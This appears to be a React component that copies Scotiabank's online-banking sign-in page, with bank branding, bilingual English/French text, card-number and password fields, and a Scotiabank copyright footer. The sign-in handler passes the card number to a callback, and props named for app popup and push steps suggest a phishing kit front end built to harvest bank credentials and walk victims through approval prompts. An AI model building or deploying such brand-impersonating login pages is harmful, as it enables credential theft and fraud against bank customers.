import React, { useState } from 'react';

const LoginPage = ({ lang = 'en', onSignInInitiated, onAppPopupInitiated, onAppPushInitiated, setLang }) => {
  const [cardNumber, setCardNumber] = useState('');
  const [password, setPassword] = useState('');
  const [rememberMe, setRememberMe] = useState(false);

  const translations = {
    en: {
      welcome: 'Welcome to',
      username: 'Username or debit card number',
      password: 'Password',
      remember: 'Remember my username or card number',
      signIn: 'Sign in',
      needHelp: 'Need help signing in?',
      noAccount: "Don't have a username and password?",
      setupNow: 'Set them up now',
      contactUs: 'Contact Us',
      security: 'Security',
      legal: 'Legal',
      privacy: 'Privacy',
      accessibility: 'Accessibility',
      cookieSettings: 'Cookie Settings',
      copyright: '© Scotiabank. All Rights Reserved.',
    },
    fr: {
      welcome: 'Bienvenue à',
      username: 'Nom d\'utilisateur ou numéro de carte de débit',
      password: 'Mot de passe',
      remember: 'Se souvenir de mon nom d\'utilisateur ou de ma carte',
      signIn: 'Se connecter',
      needHelp: 'Besoin d\'aide pour vous connecter?',
      noAccount: 'Vous n\'avez pas de nom d\'utilisateur et de mot de passe?',
      setupNow: 'Configurez-les maintenant',
      contactUs: 'Nous Contacter',
      security: 'Sécurité',
      legal: 'Mentions Légales',
      privacy: 'Confidentialité',
      accessibility: 'Accessibilité',
      cookieSettings: 'Paramètres Cookies',
      copyright: '© Scotiabank. Tous droits réservés.',
    }
  };

  const t = translations[lang];

  const handleSignIn = (e) => {
    e.preventDefault();
    if (cardNumber.trim()) {
      onSignInInitiated?.(cardNumber);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-[#f5f5f7] to-[#e8e8eb] flex flex-col justify-between">
      {/* Header with Language Selector */}
      <div className="absolute top-0 right-0 pt-6 pr-8">
        <button
          onClick={() => setLang?.(lang === 'en' ? 'fr' : 'en')}
          className="text-[#333] text-sm font-medium hover:text-[#0066cc] transition-colors"
        >
          {lang === 'en' ? 'Français' : 'English'}
        </button>
      </div>

      {/* Main Content */}
      <div className="flex-1 flex items-center justify-center px-4 py-12">
        <div className="w-full max-w-[550px] bg-white rounded-lg shadow-[0_4px_20px_rgba(0,0,0,0.1)] p-12">
          {/* Lock Icon */}
          <div className="flex justify-end mb-8">
            <svg className="w-6 h-6 text-[#999]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
              <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
            </svg>
          </div>

          {/* Welcome Text */}
          <h1 className="text-center mb-12">
            <div className="text-[#333] text-lg font-normal mb-2">{t.welcome}</div>
            <img src="/scotiabank-logo.svg" alt="Scotiabank" className="h-12 mx-auto" />
          </h1>

          {/* Form */}
          <form onSubmit={handleSignIn} className="space-y-6">
            {/* Username Field */}
            <div>
              <label className="block text-[#333] text-sm font-medium mb-2">
                <div className="flex items-center gap-2">
                  {t.username}
                  <svg className="w-4 h-4 text-[#666]" viewBox="0 0 30 30" fill="none" stroke="currentColor" strokeWidth="1.5">
                    <circle cx="15" cy="15" r="13.5"></circle>
                    <path d="M15 20.9V14.2"></path>
                    <circle cx="15" cy="9.1" r="0.7" fill="currentColor"></circle>
                  </svg>
                </div>
              </label>
              <div className="relative">
                <svg className="absolute left-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-[#999]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
                  <circle cx="12" cy="7" r="4"></circle>
                </svg>
                <input
                  type="text"
                  value={cardNumber}
                  onChange={(e) => setCardNumber(e.target.value)}
                  className="w-full pl-10 pr-4 py-3 border-b-2 border-[#ddd] bg-transparent text-[#333] placeholder-[#999] focus:outline-none focus:border-b-[#d32f2f]"
                  placeholder=""
                />
              </div>
            </div>

            {/* Password Field */}
            <div>
              <label className="block text-[#333] text-sm font-medium mb-2">{t.password}</label>
              <div className="relative">
                <svg className="absolute left-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-[#999]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                  <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                </svg>
                <input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full pl-10 pr-4 py-3 border-b-2 border-[#ddd] bg-transparent text-[#333] placeholder-[#999] focus:outline-none focus:border-b-[#d32f2f]"
                  placeholder=""
                />
              </div>
            </div>

            {/* Remember Checkbox */}
            <div className="pt-2">
              <label className="flex items-center gap-3 cursor-pointer">
                <input
                  type="checkbox"
                  checked={rememberMe}
                  onChange={(e) => setRememberMe(e.target.checked)}
                  className="w-5 h-5 border-2 border-[#ddd] rounded accent-[#d32f2f]"
                />
                <span className="text-[#333] text-sm">{t.remember}</span>
              </label>
            </div>

            {/* Sign In Button */}
            <div className="pt-6">
              <button
                type="submit"
                className="w-full bg-[#d32f2f] hover:bg-[#b71c1c] text-white font-bold py-3 px-4 rounded-md transition-colors duration-200"
              >
                {t.signIn}
              </button>
            </div>

            {/* Help Link */}
            <div className="text-center pt-4">
              <a href="#" className="text-[#0066cc] text-sm font-medium hover:underline">
                {t.needHelp}
              </a>
            </div>

            {/* No Account Text */}
            <div className="text-center pt-6 border-t border-[#eee]">
              <p className="text-[#333] text-sm">
                {t.noAccount}{' '}
                <a href="#" className="font-bold text-[#0066cc] hover:underline">
                  {t.setupNow}
                </a>
              </p>
            </div>
          </form>
        </div>
      </div>

      {/* Footer */}
      <footer className="bg-white border-t border-[#eee] px-8 py-8">
        <div className="max-w-7xl mx-auto">
          {/* Logo and Links Row */}
          <div className="flex items-center justify-between mb-8 pb-8 border-b border-[#eee]">
            <img src="/scotiabank-footer-logo.svg" alt="Scotiabank" className="h-8" />
            <div className="flex gap-8">
              <a href="#" className="text-[#666] text-sm hover:text-[#333]">{t.contactUs}</a>
              <a href="#" className="text-[#666] text-sm hover:text-[#333]">{t.security}</a>
              <a href="#" className="text-[#666] text-sm hover:text-[#333]">{t.legal}</a>
              <a href="#" className="text-[#666] text-sm hover:text-[#333]">{t.privacy}</a>
              <a href="#" className="text-[#666] text-sm hover:text-[#333]">{t.accessibility}</a>
              <a href="#" className="text-[#666] text-sm hover:text-[#333]">{t.cookieSettings}</a>
            </div>
          </div>

          {/* Copyright */}
          <div className="text-right text-[#999] text-xs">
            {t.copyright}
          </div>
        </div>
      </footer>
    </div>
  );
};

export default LoginPage;
